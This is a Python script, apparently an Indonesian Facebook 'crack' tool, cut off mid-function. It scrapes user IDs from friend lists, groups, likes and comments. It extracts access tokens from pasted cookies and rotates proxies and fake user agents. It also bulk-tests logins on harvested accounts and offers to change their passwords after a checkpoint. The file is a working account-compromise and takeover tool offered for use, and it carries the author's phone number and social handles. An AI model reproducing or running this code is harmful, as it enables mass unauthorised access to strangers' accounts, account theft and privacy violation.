###----------[ AUTHOR STROVMIRVIASKA ]---------- ###
# ------ [ Gausah Di apa - apain lagi Ntar Error ] ------ 
# Author    = 'Strovmirviaska'
# Facebook  = 'Teddy Cahyo Putra Pangembara'
# Instagram = 'teddyyyy_11'
# Tiktok    = 'teddyyyy_11'
# Whatsapp  = '082290885204'
# ------ [ Gunakan Dengan Baik ] ------ 
# [ Saya tidak akan bertanggung jawab apa yang nantinya terjadi ] 







import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%s %s %s'%(ha,op,ta)
waktu.split('/')

### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;97m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;97m' # BIRU
U = '\x1b[1;957m' # UNGU
O = '\x1b[1;97m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

############################ RESPONSE FACEBOOK ###########################################

data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
Apk = []

ok = []

cp = []

id = []

tokenku = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://mbasic.facebook.com"

url_ip = "https://www.httpbin.org/ip"

url_graph = "https://graph.facebook.com/{}"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']

#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

###########################################################################################

hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"


dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"


aaaa, bbbb, cccc = "tools", "debug", "accesstoken"

#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"

bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"

ugen2=[]

ugen=[]

try:

    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

    open('.proxy.txt','w').write(prox)
except Exception as e:



    exit(e)

for xd in range(10000):



    a='Mozilla/5.0 (Symbian/3; Series60/'



    b=random.randrange(1, 9)



    c=random.randrange(1, 9)



    d='Nokia'



    e=random.randrange(100, 9999)



    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'



    g=random.randrange(1, 9)



    h=random.randrange(1, 4)



    i=random.randrange(1, 4)



    j=random.randrange(1, 4)



    k='Mobile Safari/535.1'



    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')



    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'



    b=random.choice(['6','7','8','9','10','11','12'])



    c=' en-us; GT-'



    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])



    e=random.randrange(1, 999)



    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])



    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'



    h=random.randrange(73,100)



    i='0'



    j=random.randrange(4200,4900)



    k=random.randrange(40,150)



    l='Mobile Safari/537.36'



    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')



    ugen.append(uaku2)



    



def jalan(z):



    for e in z + '\n':



        sys.stdout.write(e)



        sys.stdout.flush()



        time.sleep(0.03)



     



def mentod():
    print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sMETHOD MENU%s'%(N,BM,N))
    print(' %s[%s1%s] Free (%sfast%s)'%(N,H,N,H,N))
    print(' [%s2%s] Mbasic (%sSlow%s)'%(H,N,H,N))
    print(' [%s3%s] Mobile (%sSuper Slow%s)'%(H,N,H,N))



#-------- LOADING ANIMASI ------------



def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")



# LOGO



def logo():
    print(f"""    
\33[31m  ██████╗ ████████╗ ██████╗  ██╗   ██╗
\33[31m ██╔════╝ ╚══██╔══╝ ██╔══██╗ ██║   ██║
\33[31m ╚█████╗     ██║    ██████╔╝ ╚██╗ ██╔╝
\33[37m  ╚═══██╗    ██║    ██╔══██╗  ╚████╔╝
\33[37m ██████╔╝    ██║    ██║  ██║   ╚██╔╝
\33[37m ╚═════╝     ╚═╝    ╚═╝  ╚═╝    ╚═╝
\x1b[0;33[GITHUB    : \33[1;32mPrivate  
\x1b[0;33[FACEBOOK  : \33[1;33mTeddy Cahyo Putra Pangembara           
\x1b[0;33[WHATSAPP  : \33[1;33m082290238779
\x1b[0;33[INSTAGRAM : \33[1;33mTeddyyyy_11     
\x1b[0;33[SCRIP FOR : \33[1;96mHacking & Cracking 
\x1b[0;33[VERSION   : \33[1;96mV.01 Beta.Test  """)


#CRACK SELESAI



def hasil(ok,cp):



    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s✓%s] %sCRACK TELAH SELESAI...\n%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,H,N,H,N))
        print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(N,H,N,H,str(len(ok)),N))
        print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(K,N,K,str(len(cp)),N))

        cek_cp = input(f"{N}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [{K}?{N}] Ingin Melihat Opsi Checkpoint ? [{H}Y{N}/{M}t{N}]: ")

        if cek_cp =="":
            print(f"\n [{M}!{N}] Don't be empty");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" {N}[{M}!{N}] Play airplanemode first");time.sleep(5)
            ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}admin123{N}")
                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split(' • ')
                print(f'{N}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[HASIL CHECKPOINT] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[HASIL CHECKPOINT] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                    print("")
            print("")
            jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
            jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Thanks You Jalankan Ulang '{H}python run.py{N}'");exit()
        else:
            print(f"\n {N}[{M}!{N}] Choose Y/t");hasil(ok,cp)
    else:
        jalan('\n\n %s[%s!%s] Sorry you didnt get results'%(N,M,N));exit()



#LOGIN KUE
def login():
	os.system('clear')
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cokie.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':kukis})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			moch_yayan(sy2,sy3)
		except KeyError:
			yayanxd()
		except requests.exceptions.ConnectionError:
			yayanxd()
	except IOError:
			yayanxd()

###### INFO UPDATE & UPGRADE SC #####

#LOGIN KUE

def yayanxd():
    os.system('clear')
    logo()
    try:
    	___kontol___ = input('[|] Masukkan Cookies : ')
    	data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___})

    	find_token = re.search("(EAAG\w+)", data.text)
    	ken=open(".token.txt", "w").write(find_token.group(1))
    	cok=open(".cokie.txt", "w").write(___kontol___)
    	print('\n LOGIN SUCCESSFULLY')
    	exit()
    except Exception as e:
    	os.system("rm -f .token.txt")
    	os.system("rm -f .cokie.txt")
    	print('invalid')
    	exit()

#LOGIN PASSWORD
### MENU UTAMA ###

def moch_yayan(my_name,my_id):
    os.system('clear')
    logo()
    ipm = requests.get(url_ip).json()
    IP = ipm["origin"]
    print("%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄"%(N))
    print(f" {BM}INFO ACCOUNT TUMBAL{N}")
    print(f"{P} [{H}•{P}] NAME   : {my_name}")
    print(f"{P} [{H}•{P}] ID     : {my_id}")
    print(f"{P} [{H}•{P}] IP     : {IP}")
    print(f"{P} [{H}•{P}] Join   : {waktu}")
    print("%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄"%(N))
    print(f" {BM}PILIHAN MENU TOOLS{N}")
    print(' [%s01%s] Crack ID Publik (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s02%s] crack ID Massal (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s03%s] Crack ID Grub Public (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s04%s] Crack Like Posts (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s05%s] Crack Comment Posts (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s06%s] Cek Opsi Checkpoint (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s07%s] Cek Hasil Crack (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s08%s] SC update info'%(H,N));time.sleep(0.03)
    print(' [%s00%s] Logout (%sRemove Cookie%s)'%(M,N,M,N));time.sleep(0.03)
    pepek = input('\n %s[%s?%s] Pilih menu : '%(N,K,N))
    if pepek == '':
        jalan('\n %s[%s×%s] Sorry the menu selection is wrong...!'%(N,M,N));time.sleep(2);login()


###### CRACK ID PUBLIK SINGEL #####

    elif pepek in['1','01']:
    	try:
    		token = open('.token.txt','r').read()
    		kukis = open('.cokie.txt','r').read()
    	except IOError:
    	   exit()
    	print("ID Target Harus Publik !")
    	pil = input(" Masukan ID :")
    	try:
    	       		for pi in requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()['friends']['data']:
    	       			nama = pi["name"]
    	       			id.append(pi['id']+'<=>'+pi['name'])
    	except KeyError:
    	       	print("Tidak Publik")
    	       	exit()
###### CRACK RANDOM ID MASSAL #####

    elif pepek in['2','02']:
        _ngocok_(tokenz)
###### CRACK GRUP #####
    elif pepek in['3','03']:
            print("%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sGROUP TARGET INFO%s"%(N,BM,N))
            kontol = input(f" {N}[{K}?{N}] Enter Group ID : {H}")
            if kontol in[""," "]:
                print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
            else:
                try:
                    cookiz = open('.cokie.txt').read()
                    kueh  = {"cookie":cookiz}
                except IOError:
                    jalan(f"\n [{M}×{N}] You login using a token, if you want to crack from a group member, please login cookies first");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
                try:
                    a = requests.get(f"https://graph.facebook.com/group/?id={kontol}&access_token={tokenz}").json()["name"]
                    if "Halaman Tidak Ditemukan" in a:
                        print(f"\n %s[%s×%s] Group with ID {kontol} not found"%(N,M,N));time.sleep(2);moch_yayan()
                    elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in a:
                        print("\n %s[%s×%s] Facebook restricts every activity, account is spammed, please switch accounts"%(N,M,N));time.sleep(2);moch_yayan()
                    elif "Konten Tidak Ditemukan" in a:
                        print(f"\n %s[%s×%s] Group with ID {kontol} not found"%(N,M,N));time.sleep(2);moch_yayan()
                    else:                    
                        print(f" {N}[{H}•{N}] Group Name : {H}{a}")
                        print(f"\n {N}[{M}!{N}] To stop {H}CTRL+c{N} on keyboard")
                        crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}", kueh)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("\n [!] Sorry no connection")                                   

###### CRACK LIKE POSTINGAN #####

    elif pepek in['4','04']:
            print("%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sLIKE TARGET INFO%s"%(N,BM,N))
            kontol = input(f" {N}[{K}?{N}] Enter Post ID : {H}")
            if kontol in[""," "]:
                print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
            try:
                cookiz = open('.cokie.txt').read()
                kueh  = {"cookie":cookiz}
            except IOError:
                jalan(f"\n {N}[{M}×{N}] You login using a token, if you want to crack from a group member, please login cookies first");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
            try:
                print(f"\n {N}[{M}!{N}] To stop {H}CTRL+c{N} on keyboard")
                like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}", kueh)
            except KeyError:
                print(f"\n [!] Post with ID {kontol} not found");time.sleep(2);moch_yayan()

###### CRACK KOMENTAR #####

    elif pepek in['5','05']:
            print("%s##################################################\n %sCOMMENT TARGET INFO%s"%(N,BM,N))
            kontol = input(f"\n {N}[{K}?{N}] Enter Post ID : {H}")
            if kontol in[""," "]:
                print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
            try:
                cookiz = open('.cokie.txt').read()
                kueh  = {"cookie":cookiz}
            except IOError:
                jalan(f"\n {N}[{M}×{N}] You login using a token, if you want to crack from a group member, please login cookies first");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
            try:
                print(f"\n {N}[{M}!{N}] To stop {H}CTRL+c{N} on keyboard")
                ngomen_post(f"https://mbasic.facebook.com/{kontol}", kueh)
            except KeyError:
                print(f"\n [!] Post with ID {kontol} not found");time.sleep(2);moch_yayan()

###### CHECKPOINT DETEDTOR #####

    elif pepek in['6','06']:
        gabut()

###### CEK HASIL CRACK #####
    elif pepek in['7','07']:
        dirs = os.listdir("results")
        print('%s##################################################\n %sFILE HASIL CRACK%s'%(N,BM,N))
        for file in dirs:
            print(" %s[%s+%s] %s"%(N,H,N,file))
        file = input("\n %s%sFILE DETAILS%s\n [%s?%s] File name : %s"%(BM,P,N,K,N,H))
        if file == "":
            file = input("\n %s%sFILE DETAILS%s\n [%s?%s] File name :%s"%(BM,P,N,K,N,H))
        total = open("results/%s"%(file)).read().splitlines()
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" %s[%s•%s] File date :%s%s\n %s[%s•%s] Total : %s%s%s"%(N,H,N,H,hps_nm,N,H,N,H,len(total),N))
        print("%s##################################################"%(N));time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[METAVERS-OK] ","\x1b[1;92m[METAVERS-OK] ").replace("[METAVERS-CP] ", "\x1b[1;93m[METAVERS-CP] ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        jalan("\n %s[%s✓%s] File check complete..."%(N,H,N))
        input(' [%sPRESS ENTER%s] Untuk Keluar !'%(H,N));exit()

###### INFO UPDATE & UPGRADE SC #####

    elif pepek in['8','08']:
        print("%s##################################################"%(N))
        jalan(f" {BM}{P}SC INFO{N}\n [{H}•{N}] Author SC : {K}Strovmirviaska\n {N}[{H}•{N}] Whatsapp : {K}+6282290238779\n {N}[{H}•{N}] Github : {K}https:github.com/Strv-BOT\n {N}[{H}•{N}] Status SC : Gratis rasa {H}Premium{N}\n\n {BM}{P}SOURC CODE{N}\n [{H}1{N}] BotX666_\n\n {BM}FIX BUG{N}\n [{H}✓{N}] Terjadinya Error saat memainkan mode pesawat saat proses crack sedang berjalan, kini sudah diperbaiki dan sudah bisa dimainkan mode pesawat saat proses crack sedang berjalan\n [{H}✓{N}] Sedikit perubahan warna text dan tampilan SC\n [{H}✓{N}] Perubahan user agent bawaan SC\n [{H}✓{N}] Penambahan menampilkan {H}Web & Aplikasi AKTIF{N}")
        upd = input('\n %s[%s?%s] Send direct message to Author [%sY%s/%st%s] : '%(N,K,N,H,N,M,N))
        if upd =="":
            exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
        elif upd in["Y","y"]:
            jalan("\n %s[%s•%s] %sYou will be redirected to the Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/+6282290238779?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);exit()
        elif upd in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] Ok, thank you...")
            jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
        else:
            exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
###### HAPUS COOKIE #####
    elif pepek in['0','00']:
        print("")
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r %s[%s!%s] Deleting Token/Cookie %s'%(N,M,N,x)); sys.stdout.flush()
            time.sleep(1)
        os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
        jalan('\n %s[%s✓%s] %sSuccessfully delete Cookie...'%(N,H,N,H))
        jalan('\n %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
    else:
        jalan('\n %s[%s×%s] Sorry menu [%s%s%s] moderate improvement...!'%(N,M,N,M,pepek,N));time.sleep(2);login()
    return __crack__().plerr(id)

###### CRACK ID RANDOM MASSAL #####

def _ngocok_(__ppk__):
    try:
        print("%s##################################################\n %sTARGET INFO%s"%(N,BM,N))
        nanya_keun = int(input(f' %s[%s?%s] Enter the target amount : %s'%(N,K,N,H)))
    except:nanya_keun=1
    print(f" %s[%s•%s] type %sme%s Crack from friends list"%(N,H,N,H,N))
    for mnh in range(nanya_keun):
        mnh +=1
        try:user = input(f' %s[%s?%s] Enter ID/Uname %s%s%s : %s'%(N,K,N,H,mnh,N,H));_memek_ = __convert__(user)
        except AttributeError:print(f" {N}[{M}×{N}] Username or ID is not public");continue
        try:
            zzz = requests.get(f"https://graph.facebook.com/v2.0/{_memek_.get('_kontol_')}?fields=friends.limit(5000)&access_token={__ppk__}").json()["friends"]
            for x in zzz["data"]:
                id.append(x["id"]+"<=>"+x["name"]+"\n")
        except (KeyError,IOError):
            jalan(f' %s[%s×%s] Sorry %sFriends ID is not public%s'%(N,M,N,M,N));continue

###### CRACK ANGGOTA GRUP PUBLIK #####

def crack_grup(url_group,kueh):
    try:
        sop_dev = BeautifulSoup(requests.get(url_group, cookies=kueh).content, "html.parser")
        members = sop_dev.find("div", id="objects_container")
        for dev in members.find_all("table"):
            user_ = dev["id"].replace("member_", "")
            nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
            try:id.append(f"{str(user_)}<=>{str(nama_)}\n")
            except:pass
            sys.stdout.write(f"\r {N}[{H}•{N}] Process Dump ID : {H}{len(id)}");sys.stdout.flush()
        if "Lihat Selengkapnya" in str(sop_dev):
            url = sop_dev.find("a", string="Lihat Selengkapnya")["href"]
            url_grup = "https://mbasic.facebook.com"+url
            crack_grup(url_group,kueh)
    except:pass
###### CRACK LIKE POSTINGAN #####

def like_post(hencet, mmk):
    try:
        kontol=requests.get(hencet,cookies=mmk).text
        if "Semua 0" in kontol:
            exit(" [!] There are no responses to this post")
        else:
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                else:
                    id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r {N}[{H}•{N}] Process Dump ID : {H}{len(id)}");sys.stdout.flush()
            if "Lihat Selengkapnya" in kontol:
                like_post("https://mbasic.facebook.com"+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"), mmk)
    except:pass
###### CRACK KOMENTAR #####

def ngomen_post(hencet, token):
    try:
        kontol= requests.get(hencet,cookies=token,headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}).text.encode("utf-8")
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('h3'):
            for _id_ in mmk.find_all('a',href=True):
                if "profile.php" in _id_.get("href"):
                    xz = _id_.get("href").split('=')[1]
                    bb = xz.split('&')[0]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                else:
                    xz = _id_.get("href").split('?')[0]
                    bb = xz.split('/')[1]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                sys.stdout.write(f"\r {N}[{H}•{N}] Process Dump ID : {H}{len(id)}");sys.stdout.flush()
        for asu in memek.find_all("a",href=True):
            if "Lihat komentar lainnyaâ€¦" in asu.text:
                ngomen_post("https://mbasic.facebook.com/"+asu.get("href"), token)
    except:pass
# USERNAME CONVERT TO ID

def __convert__(mmk):
    if "me" in mmk:
        return {"_kontol_":mmk}
    elif(re.findall("\w+",mmk)):
        r = requests.get(f"https://mbasic.facebook.com/{mmk}?_rdr").text
        try:
            user = re.findall('\;rid\=(\d+)\&',str(r))[0]
        except:
            user = mmk
    return {"_kontol_":user}

# CHEKER AKUN CHECKPOINT

def gabut():
    dirs = os.listdir("results")
    print('%s##################################################\n %sFILE RESULT CRACK%s'%(N,BM,N))
    for file in dirs:
        print(" [%s+%s] %s"%(H,N,file))
    files = input("\n %s[%s?%s] Enter file : %s"%(N,K,N,H))
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        print('\n [!] Sorry, the file doesnt exist');time.sleep(2);moch_yayan()
    ww=input(f"{N}##################################################\n [{M}!{N}] Play airplanemode first.\n##################################################\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: {K}")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f"\n {N}[{H}•{N}] Password example : {H}admin123{N}")
        pwBar=input(f" [{K}?{N}] Enter new password : {K}")
        if len(pwBar) <= 5:
             print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
        else:
            pwBaru.append(pwBar)
    print(f' %s[%s•%s] Total %s%s%s account'%(N,H,N,H,str(len(buka_baju)),N))
    print("%s##################################################"%(N))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split(' • ')
        print(f'{N}##################################################\n {H}LOGIN PROCESS')

        jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[ROY-CP] ", "")}{N}')
        try:
            log_hasil(titid[0].replace("[ROY-CP] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
            print("")
    print("")
    jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
    jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()

# CHEKPOINT DETEDTOR

def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    uas_cekdetekdor = "Mozilla/5.0 (Linux; Android 12; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_EN;FBAV/239.0.0.10.109;]"
    session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":bahasa,"referer":"https://mbasic.facebook.com/","user-agent":uas_cekdetekdor})
    soup=BeautifulSoup(session.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Turn on airplanemode 2 seconds'%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {N}[{M}×{N}] Account locked")
        else:

